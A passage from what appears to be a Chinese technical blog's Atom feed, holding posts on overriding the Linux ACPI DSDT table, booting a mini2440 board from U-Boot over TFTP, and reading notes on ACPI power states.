/boot/initrd.img-2.6.20-16-generic /boot/initrd.img-2.6.20-16-generic-bak </span><br><span class="line">sudo cp dsdt.aml /etc/initramfs-tools/DSDT.aml </span><br><span class="line">sudo update-initramfs -u -k all</span><br></pre></td></tr></table></figure></li><li><p>其二（需要安装acpiexec，为找到）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iasl -sa DSDT.dsl # e.g. recompile a modified, disassembled DSDT for </span><br><span class="line"> initramfs inclusion (see later) </span><br><span class="line">acpiexec DSDT.dat # parse, interpret and load a DSDT in userspace</span><br></pre></td></tr></table></figure></li><li><p>其三： 这个方法需要重新编译内核。<br>首先将DSDT.hex文件复制到内核源码的include目录下。 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cp DSDT.hex $SRC/include/</span><br></pre></td></tr></table></figure><p>然后修改内核配置文件.config </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STANDALONE=n </span><br><span class="line">CONFIG_ACPI_CUSTOM_DSDT=y </span><br><span class="line">CONFIG_ACPI_CUSTOM_DSDT_FILE="DSDT.hex"</span><br></pre></td></tr></table></figure><p>重新编译，更新内核，然后启动，可以在dmesg中看到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ 0.000000] ACPI: Override [DSDT- CDV-TPT], this is unsafe: tainting kernel </span><br><span class="line">[ 0.000000] Disabling lock debugging due to kernel taint </span><br><span class="line">[ 0.000000] ACPI: DSDT @ 0x7f378010 Table override, replaced with: </span><br><span class="line">[ 0.000000] ACPI: DSDT c0f0f140 0703F (v02 Intel CDV-TPT 00000000 INTL 20091214)</span><br></pre></td></tr></table></figure><p>就说明DSDT已经被替换成修改过的了。</p></li></ul><h2 id="7-打开CONFIG-ACPI-DEBUG"><a href="#7-打开CONFIG-ACPI-DEBUG" class="headerlink" title="7. 打开CONFIG_ACPI_DEBUG"></a>7. 打开CONFIG_ACPI_DEBUG</h2><p>在DSDT中添加LOG。 首先应该打开<code>CONFIG_ACPI_DEBUG=y</code>。</p><pre><code class="shell">acpi.debug_level= ACPI_LV_DEBUG_OBJECT， acpi.debug_layer= ACPI_TABLES | ACPI_NAMESPACE，</code></pre><p>  使用将想要的变量或者字符串赋值给Debug即可。 </p><blockquote><p>(Store (AAAA, Debug) </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;获取ACPI-TABLE的方法&quot;&gt;&lt;a href=&quot;#获取ACPI-TABLE的方法&quot; class=&quot;headerlink&quot; title=&quot;获取ACPI TABLE的方法&quot;&gt;&lt;/a&gt;获取ACPI TABLE的方法&lt;/h1&gt;&lt;h2 id=&quot;1-首先要安装acpidu
      
    
    </summary>
    
      <category term="电源管理" scheme="https://fengguoqing.github.io/categories/%E7%94%B5%E6%BA%90%E7%AE%A1%E7%90%86/"/>
    
    
      <category term="功耗" scheme="https://fengguoqing.github.io/tags/%E5%8A%9F%E8%80%97/"/>
    
      <category term="ACPI" scheme="https://fengguoqing.github.io/tags/ACPI/"/>
    
  </entry>
  
  <entry>
    <title>mini2440基于uboot的TFTP下载教程</title>
    <link href="https://fengguoqing.github.io/2013/01/12/mini2440%E5%9F%BA%E4%BA%8Euboot%E7%9A%84TFTP%E4%B8%8B%E8%BD%BD%E6%95%99%E7%A8%8B/"/>
    <id>https://fengguoqing.github.io/2013/01/12/mini2440基于uboot的TFTP下载教程/</id>
    <published>2013-01-11T16:04:34.000Z</published>
    <updated>2017-11-29T13:23:03.959Z</updated>
    
    <content type="html"><![CDATA[<p> 由于mini2440在WIN7上下载，USB驱动无法兼容，总是出现蓝屏重启的现象，导致不得不想其他方式来下载，首先就考虑了使用U-Boot来下载，因为它支持多种下载方式：</p><p>1. 使用串口下载，它支持kermit/xmodem/ymodem等模式，但是下载速度比较慢。 </p><p>2. 使用U盘/SD卡加载程序，需要先将程序拷贝到U盘/SD卡中，然后再通过相应的命令读取到内存中。 </p><p>3. 使用TFTP/NFS网络服务加载程序，配置好终端和服务器，使用起来比较方便，而且速度很快。 </p><p> 在这里我讲一下TFTP方式的配置过程，以及使用方式。首先需要将U-boot下载到Nand Flash中，但是由于友善之臂提供的USB驱动在WIN7及其不稳定，所以我费了九牛二虎之力才将其使用DNW下载进去。使用的是由<a href="http://blog.chinaunix.net/space.php?uid=20543672&amp;do=blog&amp;id=94376" target="_blank" rel="noopener">Tekkaman Ninja</a>移植的U-boot，可以通过git来下载源代码，下载方式是：git clone <a href="https://github.com/tekkamanninja/u-boot-2010.03-tekkaman.git" target="_blank" rel="noopener">https://github.com/tekkamanninja/u-boot-2010.03-tekkaman.git</a>。关于GIT的用法，参考<a href="http://www.arm9home.net/read.php?tid-5266.html" target="_blank" rel="noopener">http://www.arm9home.net/read.php?tid-5266.html</a>。下载完成之后需要重新编译，编译步骤如下：</p><blockquote><p>$cd u-boot-2010.03-tekkaman<br>$export PATH=$PATH:/opt/FriendlyARM/toolschain/4.4.3/bin/<br>$make ARCH=arm CROSS_COMPILE=/opt/FriendlyARM/toolschain/4.4.3/bin/arm-linux- mini2440_config<br>$make ARCH=arm CROSS_COMPILE=/opt/FriendlyARM/toolschain/4.4.3/bin/arm-linux- all </p></blockquote><p>如果你在编译的过程中碰到了invalid option的问题，那是因为git下载的文件编码格式不正确，应该使用utf-8的格式下载文件，或者使用在linux中通过git下载源代码编译，保证文件格式是正确的。最终生成的u-boot.bin可以通过supervivi菜单项里的”[a] Absolute User Application”选项 + DNW工具下载到NAND Flash中。</p><p> 将mini2440设置成nand flash启动模式，链接串口和网线，网线分为交叉网线和直连网线，mini2440赠送的是直连网线，不过网卡可以自动识别。启动串口之后就可以看到以下内容：</p><blockquote><p>U-Boot 2010.03 (Dec 27 2012 - 06:32:26)</p><p>modified by tekkamanninja (tekkamanninja@163.com)<br>Love Linux forever!!</p><p>I2C: ready<br>DRAM: 64 MB<br>Flash: 2 MB<br>NAND: 256 MiB<br>Video: 240x320x16 20kHz 62Hz<br>In: serial<br>Out: serial<br>Err: serial<br>USB slave is enable!<br>Net: dm9000<br>U-Boot 2010.03 (Dec 27 2012 - 06:32:26)<br>modified by tekkamanninja<br>(tekkamanninja@163.com)<br>Love Linux forever!!<br>Hit any key to stop autoboot: 0<br>[u-boot@MINI2440]# </p></blockquote><p>显示出机器的一些基本信息，我们可以使用printenv命令显示当前的环境变量：</p><blockquote><p>[u-boot@MINI2440]# printenv<br>bootargs=noinitrd root=/dev/nfs rw nfsroot=192.168.0.1:/home/tekkaman/working/nfs/rootfs ip=192.168.0.2:192.168.0.1::255.255.255.0 console=ttySAC0,115200 init=/linuxrc mem=64M<br>baudrate=115200<br>ethaddr=08:08:11:18:12:27<br>netmask=255.255.255.0<br>tekkaman=bmp d 70000<br>stdin=serial<br>stdout=serial<br>stderr=serial<br>ethact=dm9000<br>ipaddr=192.168.3.8<br>gatewayip=192.168.3.1<br>serverip=192.168.3.5<br>bootcmd=tftp zImage_T35.img;bootm<br>bootdelay=3</p><p>Environment size: 425/131068 bytes </p></blockquote><p>这个时候首先需要配置IP，将PC本地连接的IP和mini2440的IP配置在同一网段，ipaddr是mini2440的IP，gatewayip是网关，serverip是PC的IP，需要在PC段设置静态IP，设置完成之后一定要saveenv将设置写入flash之中，否则下载启动有得重新设置：</p><blockquote><p>[u-boot@MINI2440]# setenv ipaddr 192.168.3.8<br>[u-boot@MINI2440]# setenv gatewayip 198.168.3.1<br>[u-boot@MINI2440]# setenv serverip 192.168.3.5<br>[u-boot@MINI2440]# saveenv<br>Saving Environment to NAND…<br>Erasing Nand…<br>Erasing at 0x6000000000002 – 0% complete.<br>Writing to Nand… done </p></blockquote><p>虽然mini2440与PC通过网线连接起来的，但是PC机上的本地连接仍旧是断开的，这是因为我们使用的是直连网线，只有等到ping的时候才可以正常连接，并且只能通过mini2440 ping PC，无法通过PC来ping mini2440。</p><p>接下来需要下载TFTP服务软件，下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html" target="_blank" rel="noopener">http://tftpd32.jounin.net/tftpd32_download.html</a>。请选择合适的版本下载，安装之后打开软件配置，主要是配置Current Directory，这个路径下主要是存放你需要下载的文件的。同时需要关闭防火墙和杀毒软件，如果不想关闭它们可以通过设置允许TFTP通过windows防火墙通信来避免通信被阻挡。</p><p><a href="http://static.oschina.net/uploads/img/201301/12140641_tHaI.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201301/12140642_0b2n.jpg" alt="F6C6EC91A9B04510B809DE6E37574824" title="F6C6EC91A9B04510B809DE6E37574824"></a>[![ZD<em>J}37H`RH{O12</em>(][<a href="http://static.oschina.net/uploads/img/201301/12140642_yJ31.jpg" title="ZD_J}37H`RH{O12_(][[A" target="_blank" rel="noopener">A</a>](<a href="http://static.oschina.net/uploads/img/201301/12140642_gnRw.jpg" target="_blank" rel="noopener">http://static.oschina.net/uploads/img/201301/12140642_gnRw.jpg</a>)</p><p>比如我的mini2440 IP为192.168.3.8，PC机的本地连接IP为192.168.3.5。可以在uboot上通过ping 192.168.3.5来测试网络是否连接好了。如果可以ping通，那么会出现：</p><blockquote><p>[u-boot@MINI2440]# ping 192.168.3.5<br>dm9000 i/o: 0x20000300, id: 0x90000a46<br>DM9000: running in 16 bit mode<br>MAC: 08:08:11:18:12:27<br>operating at 100M full duplex mode<br>Using dm9000 device<br>host 192.168.3.5 is alive </p></blockquote><p>然后我们把需要下载的文件发到刚刚设置的tftpboot目录下，就可以使用下面的方法来下载了，比如我们要下载linux内核zImage_T35.img：</p><blockquote><p>[u-boot@MINI2440]# tftp zImage_T35.img<br>dm9000 i/o: 0x20000300, id: 0x90000a46<br>DM9000: running in 16 bit mode<br>MAC: 08:08:11:18:12:27<br>operating at 100M full duplex mode<br>Using dm9000 device<br>TFTP from server 192.168.3.5; our IP address is 192.168.3.8<br>Filename ‘zImage_T35.img’.<br>Load address: 0x30008000<br>Loading: T ################################################################# </p><p> ################################################################# </p><p> #########################<br>done<br>Bytes transferred = 2266708 (229654 hex) </p></blockquote><p>这样就将linux内核镜像加载到了起始地址为0x30008000的内存中，然后通过bootm命令就可以启动linux，不过前提是你得安装文件系统，否则会panic。但是如果bootm之后显示kernel参数错误，那么就是Image格式不对，需要使用下面的命令来转化：</p><blockquote><p>mkimage -n ‘linux-2.6.14’ -A arm -O linux -T kernel -C none -a 0x30008000 -e 0x30008000 -d zImage_T35 zImage_T35.img </p></blockquote><p>如果你需要将Image写入到nand flash中需要如下的操作：</p><blockquote><p>[u-boot@MINI2440]# nand erase 0x100000 300000 </p><p>NAND erase: device 0 offs et 0x100000, size 0x300000<br>Erasing at 0x3e000001800000 – 0% complete.<br>OK<br>[u-boot@MINI2440]# nand write 0x30008000 0x100000 300000 </p><p>NAND write: device 0 offset 0x100000, size 0x300000<br>Writing at 0x3e000000020000 – 100% is complete. 3145728 bytes written: OK<br>[u-boot@MINI2440]# nand device 0<br>Device 0: NAND 128MiB 3,3V 8-bit… is now current device<br>[u-boot@MINI2440]# nboot 30008000 0 0x100000 </p><p>Loading from NAND 128MiB 3,3V 8-bit, offset 0x100000<br> Image Name: tekkaman<br> Created: 2010-03-29 12:59:51 UTC<br> Image Type: ARM Linux Kernel Image (uncompressed)<br> Data Size: 2277476 Bytes = 2.2 MB<br> Load Address: 30008000<br> Entry Point: 30008040 </p><p>[u-boot@MINI2440]# bootm 30008000 </p><h2 id="Booting-kernel-from-Legacy-Image-at-30008000-…"><a href="#Booting-kernel-from-Legacy-Image-at-30008000-…" class="headerlink" title="Booting kernel from Legacy Image at 30008000 …"></a>Booting kernel from Legacy Image at 30008000 …</h2><p> Image Name: tekkaman<br> Created: 2010-03-29 12:59:51 UTC<br> Image Type: ARM Linux Kernel Image (uncompressed)<br> Data Size: 2277476 Bytes = 2.2 MB<br> Load Address: 30008000<br> Entry Point: 30008040<br> Verifying Checksum … OK<br> XIP Kernel Image … OK<br>OK </p><p>Starting kernel … </p></blockquote><p>如果我们需要调试的是一般程序，那么通过tftp下载之后，可以使用go 30008000来运行，注意由于友善之臂提供的代码入口地址都是0x30000000，所以不能运行，我们自己编写的程序入口地址应该设置为0x30008000.</p><p>[![A}ID4%JT@RKTF2EJ<a href="http://static.oschina.net/uploads/img/201301/12201708_ADi0.jpg" title="A}ID4%JT@RKTF2EJ[~%N{FL" target="_blank" rel="noopener">~%N{FL</a>](<a href="http://static.oschina.net/uploads/img/201301/12201707_i9O9.jpg" target="_blank" rel="noopener">http://static.oschina.net/uploads/img/201301/12201707_i9O9.jpg</a>)</p><p>下面介绍一个简单的调试方法，因为我们每次调试代码都需要不断的下载新的编译程序。</p><p>1. 首先设置tftp 的Current Directory为工程生成bin文件的目录。</p><p>2. 设置环境变量bootcmd和bootdelay：</p><blockquote><p>[u-boot@MINI2440]# setenv bootdelay 1<br>[u-boot@MINI2440]# setenv bootcmd “tftp 2440test.bin;go 0x30008000”<br>[u-boot@MINI2440]# saveenv<br>Saving Environment to NAND…<br>Erasing Nand…<br>Erasing at 0x6000000000002 – 0% complete.<br>Writing to Nand… done </p></blockquote><p>注意2440test.bin为项目最终生成的bin文件名字，你的项目生成的是什么名字，这里就填写什么名字。</p><p>以后每次你打开mini2440，它就会自动下载最新的bin文件，并且执行它，你就可以立即看到结果，根本不需要你动手去下载，是不是很方便。</p><blockquote><p>U-Boot 2010.03 (Dec 27 2012 - 06:32:26)</p><p>modified by tekkamanninja (tekkamanninja@163.com)<br>Love Linux forever!!</p><p>I2C: ready<br>DRAM: 64 MB<br>Flash: 2 MB<br>NAND: 256 MiB<br>Video: 240x320x16 20kHz 62Hz<br>In: serial<br>Out: serial<br>Err: serial<br>USB slave is enable!<br>Net: dm9000<br>U-Boot 2010.03 (Dec 27 2012 - 06:32:26)<br>modified by tekkamanninja<br>(tekkamanninja@163.com)<br>Love Linux forever!!<br>Hit any key to stop autoboot: 0<br>dm9000 i/o: 0x20000300, id: 0x90000a46<br>DM9000: running in 16 bit mode<br>MAC: 08:08:11:18:12:27<br>operating at 100M full duplex mode<br>Using dm9000 device<br>TFTP from server 192.168.3.5; our IP address is 192.168.3.8<br>Filename ‘2440test.bin’.<br>Load address: 0x30008000<br>Loading: T ##########################################<br>done<br>Bytes transferred = 613092 (95ae4 hex) </p><h2 id="Starting-application-at-0x30008000-…"><a href="#Starting-application-at-0x30008000-…" class="headerlink" title="Starting application at 0x30008000 …"></a>Starting application at 0x30008000 …</h2><p>&lt;<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>&gt;<br> SBC2440 Test Program VER1.0<br> www.arm9.net<br> Build time is: Jan 08 2013 23:05:30<br> Image$$RO$$Base = 0x30008000<br> Image$$RO$$Limit = 0x3003c4fc<br> Image$$RW$$Base = 0x3003c4fc<br> Image$$RW$$Limit = 0x300ea2b4<br> Image$$ZI$$Base = 0x3009dae4<br> Image$$ZI$$Limit = 0x300ea2b4<br>&lt;<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>&gt;</p><p>Please select function :<br>0 : Please input 1-16 to select test<br>1 : Test PWM<br>2 : RTC time display<br>3 : Test ADC<br>4 : Test interrupt and key scan<br>5 : Test Touchpanel<br>6 : Test TFT-LCD or VGA1024x768 module<br>7 : Test IIC EEPROM, if use QQ2440, please remove the LCD<br>8 : UDA1341 play music<br>9 : Test SD Card<br>10 : Test CMOS Camera </p></blockquote><p>下面提供一些参考链接，希望对你有帮助：</p><p>Tekkaman Ninja的博客：<a href="http://blog.chinaunix.net/space.php?uid=20543672&amp;do=blog&amp;id=94376" target="_blank" rel="noopener">http://blog.chinaunix.net/space.php?uid=20543672&amp;do=blog&amp;id=94376</a></p><p>Tekkaman Ninja的Github：<a href="https://github.com/tekkamanninja/u-boot-2010.03-tekkaman" target="_blank" rel="noopener">https://github.com/tekkamanninja/u-boot-2010.03-tekkaman</a></p><p>ARM9 之家论坛：<a href="http://www.arm9home.net/simple/index.php?t3539.html" target="_blank" rel="noopener">http://www.arm9home.net/simple/index.php?t3539.html</a></p><p>U-boot官方网站：<a href="http://www.denx.de/wiki/U-Boot" target="_blank" rel="noopener">http://www.denx.de/wiki/U-Boot</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 由于mini2440在WIN7上下载，USB驱动无法兼容，总是出现蓝屏重启的现象，导致不得不想其他方式来下载，首先就考虑了使用U-Boot来下载，因为它支持多种下载方式：&lt;/p&gt;
&lt;p&gt;1. 使用串口下载，它支持kermit/xmodem/ymodem等模式，但是下载速度
      
    
    </summary>
    
    
      <category term="教程" scheme="https://fengguoqing.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>ACPI规范阅读笔记</title>
    <link href="https://fengguoqing.github.io/2013/01/10/ACPI%E8%A7%84%E8%8C%83%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <id>https://fengguoqing.github.io/2013/01/10/ACPI规范阅读笔记/</id>
    <published>2013-01-10T14:09:58.000Z</published>
    <updated>2017-11-29T16:26:59.796Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、-ACPI主要包含以下几个部分："><a href="#1、-ACPI主要包含以下几个部分：" class="headerlink" title="1、 ACPI主要包含以下几个部分："></a>1、 ACPI主要包含以下几个部分：</h3><ul><li>系统电源管理</li><li>设备电源管理</li><li>处理器电源管理</li><li>即插即用</li><li>处理系统事件</li><li>电池管理</li><li>热量管理</li></ul><h3 id="2、-ACPI规范不是仅仅针对某一项调节，而是要协调各个部分，综合管理，使其达到最佳状态。"><a href="#2、-ACPI规范不是仅仅针对某一项调节，而是要协调各个部分，综合管理，使其达到最佳状态。" class="headerlink" title="2、 ACPI规范不是仅仅针对某一项调节，而是要协调各个部分，综合管理，使其达到最佳状态。"></a>2、 ACPI规范不是仅仅针对某一项调节，而是要协调各个部分，综合管理，使其达到最佳状态。</h3><h3 id="3、-ACPI是一种工业级的接口协议，它同时规范了硬件和软件的接口，使得OS可以直接配置和电源管理所有设备以及整个系统。操作系统可以收集用户、应用、硬件等各方面信息做出综合判断以及执行。"><a href="#3、-ACPI是一种工业级的接口协议，它同时规范了硬件和软件的接口，使得OS可以直接配置和电源管理所有设备以及整个系统。操作系统可以收集用户、应用、硬件等各方面信息做出综合判断以及执行。" class="headerlink" title="3、 ACPI是一种工业级的接口协议，它同时规范了硬件和软件的接口，使得OS可以直接配置和电源管理所有设备以及整个系统。操作系统可以收集用户、应用、硬件等各方面信息做出综合判断以及执行。"></a>3、 ACPI是一种工业级的接口协议，它同时规范了硬件和软件的接口，使得OS可以直接配置和电源管理所有设备以及整个系统。操作系统可以收集用户、应用、硬件等各方面信息做出综合判断以及执行。</h3><h3 id="4、-支持传统BIOS电源管理的电脑从传统模式启动然后等到ACPI-OS启动之后转换到工作状态。而不支持传统模式的电脑如（RISC：ARM）直接冲G3直接到G0。"><a href="#4、-支持传统BIOS电源管理的电脑从传统模式启动然后等到ACPI-OS启动之后转换到工作状态。而不支持传统模式的电脑如（RISC：ARM）直接冲G3直接到G0。" class="headerlink" title="4、 支持传统BIOS电源管理的电脑从传统模式启动然后等到ACPI OS启动之后转换到工作状态。而不支持传统模式的电脑如（RISC：ARM）直接冲G3直接到G0。"></a>4、 支持传统BIOS电源管理的电脑从传统模式启动然后等到ACPI OS启动之后转换到工作状态。而不支持传统模式的电脑如（RISC：ARM）直接冲G3直接到G0。</h3><h3 id="5、-ACPI的几个状态"><a href="#5、-ACPI的几个状态" class="headerlink" title="5、 ACPI的几个状态"></a>5、 ACPI的几个状态</h3><p>ACPI规范定义了一台兼容ACPI的计算机系统可以有以下七个状态（所谓的全局状态）：<br><strong>G0(S0)正常工作状态</strong><br>计算机的正常工作状态-操作系统和应用程序都在运行。CPU(s)执行指令。 在这个状态下(即没有进入G1睡眠)，CPU和硬盘、DVD驱动器等等这些的设备可以一再的进入和从低能源状态回来，叫做C0-Cn和D0-D3。(例如膝上型计算机，当使用电池运行的时候通常关掉所有当前未使用的设备，一些桌面型计算机也这么做来减少噪声。)</p><p><strong>G1 睡眠</strong><br>细分为从S1到S4这四种状态。系统从这几种状态被唤醒到G0运行（唤醒等待时间）所需的时间最短的是S1，较短的是S2和S3，不太短的是S4。<br>  <strong>S1</strong><br>  最耗电的睡眠模式。处理器的所有寄存器被刷新，并且CPU停止执行指令。CPU和内存的电源一直维持着，一些设备如果没有被使用那么就会被停止供电。这种模式通常指上电待机或者简单叫做POS，特别在BIOS设置界面上。一些新式的计算机不再支持S1；老式的电脑对S1支持可能要比S3好。<br>  <strong>S2</strong><br>  一个比S1更深的睡眠状态，不过已经不给CPU供电了；然而，通常这种模式并不被采用。<br>  <strong>S3</strong><br>  在BIOS中叫做”挂到内存” (Suspend to RAM/STR)，在Windows XP以后的Windows版本和一些Linux发行版中叫做”待机(Standby)”， 在Windows Vista和Mac OS X则叫做”睡眠(Sleep)”，虽然ACPI规范仅仅提到术语”S3”和”睡眠(Sleep)”。在这个状态下，主存储器(RAM)仍然有电源供给，尽管它也是几乎唯一的有电源供给的原件。因为操作系统、 所有应用程序和被打开的文档等等的状态都是保存在主存储器中，用户可以把工作恢复到正好上次他们保持的状态-计算机从S3状态回来时主存储器的内容和它进 入S3状态时候的内容是相同象的。(规范中提到了S3和S2是相当类似的，只有更多的组件在S3状态下会被关掉电源。) 相比较S4来说S3有两个好处；计算机恢复的过程比重启要快，第二，如果任何正在运行的应用程序(被打开的文档等等)有私有信息在里面，这些信息是不会被 写到硬盘上的。然而，在系统不能被唤醒比如遇到了电源故障的时候，高速缓冲存储器可能会被flushed来防止数据毁坏。<br>  <strong>S4</strong><br>  在Windows中叫休眠， 在Mac OS X中叫作安全睡眠，也称为挂到硬盘，虽然ACPI规范中只提到了一个术语S4（main article: Hibernate(OS feature))。在这个状态下，所有主存储器的内容被储存在非挥发性存储器，例如硬盘， 保护操作系统当前的状态，包括所有应用程序,打开的文档等.这意味着从S4恢复后，用户可以恢复到原本的工作状态，采用的方法和S3是一样的。S4和S3 之间的差异是，除了把主存储器中的内容移进移出所消耗的时间以外,在S3状态下的时候如果一旦停电了,所有主存储器上的数据就会丢失,包括所有的没有保存 的文档,而在S4状态下则没有影响.S4和其他的S状态有很大不同,事实上更类似G2Soft Off状态和G3 Mechanical Off状态,而不是S1-S3.在S4状态下的系统同样可进入G3(Mechanical Off)状态,并且保留S4时候的状态信息.所以它可以恢复到以前的运行状态在关掉电源之后.</p><p><strong>G2（S5）Soft Off</strong><br>G2，S5，和Soft Off都是相同的叫法。G2和G3Mechanical Off几乎是相同的，但有些部件仍然带电，使计算机仍然可以被键盘、时钟、modem（电话唤醒）、LAN（网络唤醒）还有USB设备所唤醒。在启动系统从G2恢复到G0正常工作模式的过程中，无论是G3 Mechanical Off还是G2都得运行启动程序来启动操作系统。</p><p>此外，当操作系统在不支持ACPI的情况下运行，这种状态被定义为Legacy。在这个状态下，硬件和电源不是通过ACPI来管理的，实际上已经禁用了ACPI。<br>（参考资料：ACPI规范3.0b版的链接在下面 External links, 查看chapter 7.3.4)</p><p><strong>设备电源状态(Device Power State)</strong><br>设备状态对于用户来说往往是不可见的，比如当一个设备已经没有电源供应的时候，可能整个系统还是在工作状态，光驱应该是一个很好的例子吧。设备状态是与设备相关的状态，他们的定义和以下四个因素有关：</p><ol><li>设备消耗多少能源?</li><li>硬件保存多少设备的上下文信息?</li><li>设备要恢复工作，其驱动程序要作什么工作?</li><li>延迟是多少?</li></ol><p>设备状态有一下几个：<br>  <strong>D0</strong> Fully-On 是（正常）工作状态，电源消耗量最多，设备是完全被相应的，并且设备保留了全部的设备状态/环境。<br>  <strong>D1</strong> 和<strong>D2</strong>是中间电源状态，它的定义根据设备的不同而有所不同。<br>  <strong>D3</strong> Off是设备电源关闭所以对总线来说是没有相应的。设备状态/环境全部丢失，操作系统会重新初始化设备当重新给它加电的时候。这个状态下的设备恢复到D0相比之下需要最长的时间。</p><p><strong>处理器电源状态(Processor Power State)</strong><br>  处理器电源状态（C0到C3状态，后面还有Cn）是指在G0状态下（只对G0状态有效，在其他状态下不予讨论）的处理器电能消耗和温度管理的状态。只有C0状态下CPU才会执行指令，C1到Cn状态下CPU都处于各种不同程度的睡眠状态（Sleeping States），在这睡眠状态下，CPU都有一个恢复到C0的唤醒时间（latency），它是和CPU的电能消耗有关的，通常，用电能量越小意味着得花更长的时间恢复到C0状态，也就是唤醒时间越长。当在C0状态下时，ACPI允许通过定义节流阀（throttling）过程，和通过改变多性能状态（multiple performance states，P-states）来改变处理器的性能。</p><p>各个状态的定义如下所示：<br>    <strong>C0</strong>是正常工作状态，当处理器处于这种状态下的时候，它能正常处理指令。<br>    <strong>C1</strong>（通常称为Halt）拥有最短的唤醒时间，这个延时必须短到操作系统软件使用CPU的时候不会考虑到唤醒时间方面的因素。一些处理器，比如说奔腾4（Pentium 4），支持C1E（Enhanced C1 state）这样的低电能消耗技术。这个状态是不被软件所见的。<br>    <strong>C2</strong> (通常称为Stop-Clock)，这个状态下处理器维持着所有的软件所见的状态信息，但是需要更长的时间来恢复到C0。这个状态下情况最坏的硬件唤醒时间是由ACPI固件提供，并且操作系统软件可以利用这些信息来决定是采用C1而不是C2状态，C2比C1更省电。<br>    <strong>C3</strong> (通常称为Sleep)，相比C1和C2更省电了。这个状态下情况最坏的硬件唤醒时间是由ACPI固件提供，并且操作系统软件可以利用这些信息来决定是采用C2而不是C3状态，当处于C3状态时，处理器缓存保留了<img src="http://static.oschina.net/uploads/img/201301/10220949_UUzr.jpg" alt="clip_image001[6]"><br>  所有的状态信息，但是忽略所有的侦听。操作系统软件负责保证缓存数据的一致性。<br>  <img src="http://static.oschina.net/uploads/img/201301/10220950_eHZ6.jpg" alt="clip_image003[6]" title="c5-c0-c5"><br>  <img src="http://static.oschina.net/uploads/img/201301/10220951_Ds0z.jpg" alt="clip_image005[6]" title="c0-c4-c0"><br>  下面简单的说一下，CPU 信号解锁 随后到来是 STPCLK# 之后CPU 信号被锁定。 南桥发出DPSLP# 意思为：深度睡眠，DPSLP＃是由CH9南桥发出。当信号低，处理器进入深度睡眠状态会关闭处理器的处理器核心时钟。 接着来的是STP_CPU#，但是CPU的 时钟信号还是一直保持着的。随着唤醒的来了，信号逐一解锁，CPU 开始接受信号 正常工作。C0 TO C5/C6 不同的时候会关闭VCORE,多了一些信号。</p><h3 id="6、-D0和C0状态都可以分为P0-Pn，性能和耗电量逐渐递减。"><a href="#6、-D0和C0状态都可以分为P0-Pn，性能和耗电量逐渐递减。" class="headerlink" title="6、 D0和C0状态都可以分为P0-Pn，性能和耗电量逐渐递减。"></a>6、 D0和C0状态都可以分为P0-Pn，性能和耗电量逐渐递减。</h3><p><img src="http://static.oschina.net/uploads/img/201301/10220953_psLc.png" alt="clip_image007[6]"><br><img src="http://static.oschina.net/uploads/img/201301/10220955_atSR.jpg" alt="clip_image009[6]"></p><h3 id="7、-ACPI-Table会被载入到内存中，BIOS和OS都可以去读取和修改它。"><a href="#7、-ACPI-Table会被载入到内存中，BIOS和OS都可以去读取和修改它。" class="headerlink" title="7、 ACPI Table会被载入到内存中，BIOS和OS都可以去读取和修改它。"></a>7、 ACPI Table会被载入到内存中，BIOS和OS都可以去读取和修改它。</h3><h3 id="8、-ACPI将硬件分为两类-FIXED，GENERIC。在FIXED范围内的硬件必须满足ACPI编程和行为标准-在GENERIC范围内的硬件在实现时有一定程度的灵活性。FIXED编程模型要求在特定的地址位置定义寄存器，而GENERIC编程模型则允许寄存器被安排在更广泛的地址空间。ACPI驱动器可以直接操作FIXED寄存器空间，而ACPI依赖0EM厂商提供的“伪码”-ASL码-来操作GENERIC寄存器空间。"><a href="#8、-ACPI将硬件分为两类-FIXED，GENERIC。在FIXED范围内的硬件必须满足ACPI编程和行为标准-在GENERIC范围内的硬件在实现时有一定程度的灵活性。FIXED编程模型要求在特定的地址位置定义寄存器，而GENERIC编程模型则允许寄存器被安排在更广泛的地址空间。ACPI驱动器可以直接操作FIXED寄存器空间，而ACPI依赖0EM厂商提供的“伪码”-ASL码-来操作GENERIC寄存器空间。" class="headerlink" title="8、 ACPI将硬件分为两类:FIXED，GENERIC。在FIXED范围内的硬件必须满足ACPI编程和行为标准.在GENERIC范围内的硬件在实现时有一定程度的灵活性。FIXED编程模型要求在特定的地址位置定义寄存器，而GENERIC编程模型则允许寄存器被安排在更广泛的地址空间。ACPI驱动器可以直接操作FIXED寄存器空间，而ACPI依赖0EM厂商提供的“伪码”(ASL码)来操作GENERIC寄存器空间。"></a>8、 ACPI将硬件分为两类:FIXED，GENERIC。在FIXED范围内的硬件必须满足ACPI编程和行为标准.在GENERIC范围内的硬件在实现时有一定程度的灵活性。FIXED编程模型要求在特定的地址位置定义寄存器，而GENERIC编程模型则允许寄存器被安排在更广泛的地址空间。ACPI驱动器可以直接操作FIXED寄存器空间，而ACPI依赖0EM厂商提供的“伪码”(ASL码)来操作GENERIC寄存器空间。</h3><h3 id="9、-每一睡眠状态都指定-谁负责保持系统上下文，谁负责唤醒序列。"><a href="#9、-每一睡眠状态都指定-谁负责保持系统上下文，谁负责唤醒序列。" class="headerlink" title="9、 每一睡眠状态都指定:谁负责保持系统上下文，谁负责唤醒序列。"></a>9、 